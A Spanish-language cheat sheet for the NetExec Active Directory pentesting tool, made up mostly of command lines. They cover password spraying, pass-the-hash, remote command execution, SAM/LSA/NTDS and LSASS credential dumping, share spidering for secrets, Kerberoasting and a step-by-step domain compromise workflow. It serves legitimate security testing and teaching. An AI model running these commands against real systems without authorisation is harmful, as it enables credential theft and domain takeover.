# NetExec



NetExec es la herramienta central en auditorías de Active Directory. Sucesor activo de CrackMapExec, permite verificar credenciales, enumerar información del dominio, ejecutar comandos y volcar credenciales a escala de red con un único comando. Su diseño modular a través de módulos (`-M`) amplía sus capacidades a prácticamente cualquier técnica de post-explotación estándar.

### Instalación

```bash
pip3 install netexec

# Alternativa — paquete del sistema
apt install crackmapexec    # nombre legacy, misma herramienta en Kali

# Verificar versión
nxc --version
```

### Protocolos soportados

NetExec opera sobre múltiples protocolos según el servicio objetivo:

| Protocolo | Uso principal                                                      |
| --------- | ------------------------------------------------------------------ |
| `smb`     | Autenticación Windows, ejecución de comandos, dump de credenciales |
| `winrm`   | PowerShell remoting sobre WinRM                                    |
| `rdp`     | Verificación de credenciales RDP                                   |
| `ldap`    | Consultas a Active Directory, AS-REP/Kerberoasting                 |
| `mssql`   | Acceso a Microsoft SQL Server                                      |
| `ssh`     | Acceso SSH a Linux/macOS                                           |
| `ftp`     | Acceso FTP                                                         |
| `wmi`     | Ejecución via WMI                                                  |

### Sintaxis general

```bash
nxc <protocolo> <target> -u <usuario> -p <contraseña> [opciones]
```

El target puede ser una IP, un rango CIDR, un fichero de hosts o un hostname.

### Verificación de credenciales

La función más básica y más usada: verificar si unas credenciales son válidas en uno o múltiples hosts. NetExec muestra `[+]` en verde para éxito y `[-]` en rojo para fallo. El indicador `(Pwn3d!)` aparece cuando la cuenta tiene privilegios de administrador local.

```bash
# Verificar credenciales en un host
nxc smb 10.10.10.10 -u usuario -p contraseña

# Sweep de red completa
nxc smb 10.10.10.0/24 -u usuario -p contraseña

# Pass-the-Hash — usar NT hash en lugar de contraseña
nxc smb 10.10.10.0/24 -u usuario -H aad3b435b51404eeaad3b435b51404ee:NTHASH

# Solo el NT hash (sin la parte LM)
nxc smb 10.10.10.10 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

# Cuenta local (no de dominio)
nxc smb 10.10.10.0/24 -u Administrator -p contraseña --local-auth

# Autenticación null — sin credenciales
nxc smb 10.10.10.0/24 -u '' -p ''

# Autenticación anónima guest
nxc smb 10.10.10.0/24 -u 'guest' -p ''
```

### Password spraying y listas

```bash
# Lista de usuarios con una sola contraseña (spraying)
nxc smb 10.10.10.10 -u users.txt -p 'Password2024!'

# Lista de usuarios con lista de contraseñas
# --no-bruteforce: prueba user[0]:pass[0], user[1]:pass[1]... (no todas las combinaciones)
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce

# Sin --no-bruteforce: prueba todas las combinaciones (cuidado con lockout)
nxc smb 10.10.10.10 -u users.txt -p passwords.txt

# Continuar aunque encuentre credenciales válidas
nxc smb 10.10.10.0/24 -u users.txt -p 'Password2024!' --continue-on-success
```

> ⚠️ **Atención:** Sin `--no-bruteforce`, NetExec prueba todas las combinaciones posibles y puede provocar lockouts masivos. Siempre verificar la política de bloqueo con `--pass-pol` antes de hacer spraying.

### Verificación por protocolo

```bash
# WinRM — PowerShell Remoting
nxc winrm 10.10.10.0/24 -u usuario -p contraseña

# RDP
nxc rdp 10.10.10.0/24 -u usuario -p contraseña

# LDAP — requiere conectividad al DC
nxc ldap 10.10.10.10 -u usuario -p contraseña

# MSSQL
nxc mssql 10.10.10.10 -u sa -p contraseña

# SSH
nxc ssh 10.10.10.10 -u root -p contraseña
```

### Enumeración de AD

```bash
# Usuarios del dominio
nxc smb 10.10.10.10 -u usuario -p contraseña --users

# Grupos del dominio
nxc smb 10.10.10.10 -u usuario -p contraseña --groups

# Equipos del dominio
nxc smb 10.10.10.10 -u usuario -p contraseña --computers

# Shares accesibles
nxc smb 10.10.10.10 -u usuario -p contraseña --shares

# Política de contraseñas — crítico antes de spraying
nxc smb 10.10.10.10 -u usuario -p contraseña --pass-pol

# Usuarios con sesión activa en el host
nxc smb 10.10.10.10 -u usuario -p contraseña --loggedon-users

# Sesiones activas
nxc smb 10.10.10.10 -u usuario -p contraseña --sessions

# Información del DC y del dominio
nxc smb 10.10.10.10 -u usuario -p contraseña --domain-info

# Enumeración LDAP — usuarios con atributos
nxc ldap 10.10.10.10 -u usuario -p contraseña --users
nxc ldap 10.10.10.10 -u usuario -p contraseña --groups
nxc ldap 10.10.10.10 -u usuario -p contraseña --computers
```

### Ejecución de comandos

Para ejecutar comandos se necesita administrador local en el host objetivo (`Pwn3d!`).

```bash
# CMD
nxc smb 10.10.10.10 -u usuario -p contraseña -x "whoami"
nxc smb 10.10.10.10 -u usuario -p contraseña -x "ipconfig /all"

# PowerShell
nxc smb 10.10.10.10 -u usuario -p contraseña -X "Get-Process"
nxc smb 10.10.10.10 -u usuario -p contraseña -X "Get-ADUser -Filter *"

# En múltiples hosts simultáneamente
nxc smb 10.10.10.0/24 -u Administrator -H NTHASH -x "net user"

# WinRM — más estable para comandos interactivos
nxc winrm 10.10.10.10 -u usuario -p contraseña -x "whoami /all"
nxc winrm 10.10.10.10 -u usuario -p contraseña -X "Get-LocalGroupMember Administrators"
```

#### Métodos de ejecución (`--exec-method`)

Por defecto NetExec elige el método automáticamente. Se puede forzar uno específico:

```bash
# Métodos disponibles: wmiexec, smbexec, atexec, mmcexec
nxc smb 10.10.10.10 -u usuario -p contraseña -x "whoami" --exec-method wmiexec
nxc smb 10.10.10.10 -u usuario -p contraseña -x "whoami" --exec-method smbexec
```

| Método    | Características                                          |
| --------- | -------------------------------------------------------- |
| `wmiexec` | No crea servicios, output via share SMB — predeterminado |
| `smbexec` | Crea servicio temporal, más compatible                   |
| `atexec`  | Via Task Scheduler — menos detección                     |
| `mmcexec` | Via MMC COM — evita algunos controles                    |

### Dump de credenciales

```bash
# Volcar SAM (hashes de cuentas locales)
nxc smb 10.10.10.10 -u usuario -p contraseña --sam

# Volcar LSA secrets (credenciales de servicios, caché de dominio)
nxc smb 10.10.10.10 -u usuario -p contraseña --lsa

# DCSync / NTDS dump — requiere DA o permisos de replicación
nxc smb 10.10.10.10 -u usuario -p contraseña --ntds

# LSASS dump via módulo lsassy
nxc smb 10.10.10.10 -u usuario -p contraseña -M lsassy

# Alternativa a lsassy — nanodump (más sigiloso)
nxc smb 10.10.10.10 -u usuario -p contraseña -M nanodump

# DPAPI — credenciales cifradas con DPAPI
nxc smb 10.10.10.10 -u usuario -p contraseña --dpapi
```

### Spider de shares

```bash
# Spider plus — indexa todos los shares y archivos accesibles (más completo)
nxc smb 10.10.10.10 -u usuario -p contraseña -M spider_plus

# Spider con filtro de contenido en un share específico
nxc smb 10.10.10.10 -u usuario -p contraseña \
  --spider IT --content --pattern "password|cred|secret"

# Buscar por extensión de archivo
nxc smb 10.10.10.10 -u usuario -p contraseña \
  --spider IT --pattern "\.kdbx$|\.pfx$|\.pem$"

# Buscar en el share C$
nxc smb 10.10.10.10 -u usuario -p contraseña \
  --spider C$ --content --pattern "passw"

# Generar lista de targets sin SMB signing (para NTLMRelay)
nxc smb 10.10.10.0/24 -u usuario -p contraseña --gen-relay-list relay_targets.txt
```

### Módulos de ataque

Los módulos extienden las capacidades de NetExec con técnicas específicas:

```bash
# GPP Passwords — contraseñas en Group Policy Preferences
nxc smb 10.10.10.10 -u usuario -p contraseña -M gpp_password

# LAPS — recuperar contraseñas de admin local gestionadas por LAPS
nxc ldap 10.10.10.10 -u usuario -p contraseña -M laps

# AS-REP Roasting — cuentas sin preautenticación Kerberos
nxc ldap 10.10.10.10 -u usuario -p contraseña --asreproast asrep_hashes.txt

# Kerberoasting — TGS de cuentas con SPN
nxc ldap 10.10.10.10 -u usuario -p contraseña --kerberoasting kerb_hashes.txt

# Zerologon — verificar vulnerabilidad (no explotar)
nxc smb 10.10.10.10 -u usuario -p contraseña -M zerologon

# PetitPotam — forzar autenticación NTLM del DC
nxc smb 10.10.10.10 -u usuario -p contraseña -M petitpotam

# Enum shares con información adicional
nxc smb 10.10.10.10 -u usuario -p contraseña -M enum_shares

# WebDav — detectar WebDAV activo (útil para relay)
nxc smb 10.10.10.0/24 -u usuario -p contraseña -M webdav
```

#### Ver módulos disponibles

```bash
# Listar todos los módulos
nxc smb -L
nxc ldap -L
nxc winrm -L

# Ver opciones de un módulo específico
nxc smb -M lsassy --options
nxc ldap -M laps --options
```

### Opciones globales útiles

```bash
# Aumentar threads para mayor velocidad (default: 100)
nxc smb 10.10.10.0/24 -u usuario -p contraseña -t 200

# Solo mostrar hosts donde las credenciales funcionan
nxc smb 10.10.10.0/24 -u usuario -p contraseña --no-bruteforce 2>/dev/null | grep "+"

# Output a fichero
nxc smb 10.10.10.0/24 -u usuario -p contraseña -o resultados.txt

# Verbose — mostrar más detalles
nxc smb 10.10.10.10 -u usuario -p contraseña -v

# No verificar certificado (LDAPS, WinRM sobre HTTPS)
nxc ldap 10.10.10.10 -u usuario -p contraseña --no-bruteforce --ssl

# Especificar dominio explícitamente
nxc smb 10.10.10.10 -u usuario -p contraseña -d EMPRESA.LOCAL

# Kerberos en lugar de NTLM
nxc smb 10.10.10.10 -u usuario -p contraseña -k

# Usar ticket Kerberos del entorno (.ccache)
KRB5CCNAME=ticket.ccache nxc smb 10.10.10.10 -k --no-pass
```

### Base de datos integrada

NetExec guarda automáticamente todos los resultados en una base de datos SQLite. Esto permite consultar hosts, credenciales y shares encontrados sin relanzar escaneos:

```bash
# Acceder a la base de datos
nxc smb --help  # muestra la ruta de la DB

# Comandos de la DB (dentro del CLI de nxc)
nxc db

# Dentro del CLI:
# hosts          — listar hosts descubiertos
# creds          — listar credenciales encontradas
# shares         — listar shares
# export creds csv /tmp/creds.csv   — exportar credenciales
```

Los logs de cada sesión se guardan en `~/.nxc/logs/`.

### Flujo típico en un pentest AD

```bash
# 1. Descubrir hosts con SMB activo y obtener info de dominio
nxc smb 10.10.10.0/24

# 2. Verificar política de contraseñas antes de spraying
nxc smb 10.10.10.10 -u usuario -p contraseña --pass-pol

# 3. Password spraying con lista pequeña
nxc smb 10.10.10.0/24 -u users.txt -p 'Password2024!' --continue-on-success

# 4. Con credenciales válidas — enumerar el dominio
nxc smb 10.10.10.10 -u jsmith -p 'Password2024!' --users --groups --shares

# 5. Buscar hosts donde el usuario es admin local
nxc smb 10.10.10.0/24 -u jsmith -p 'Password2024!' | grep "Pwn3d!"

# 6. Volcar credenciales de hosts comprometidos
nxc smb 10.10.10.10 -u jsmith -p 'Password2024!' --sam --lsa

# 7. Con hash de DA — DCSync
nxc smb 10.10.10.10 -u Administrator -H NTHASH --ntds
```
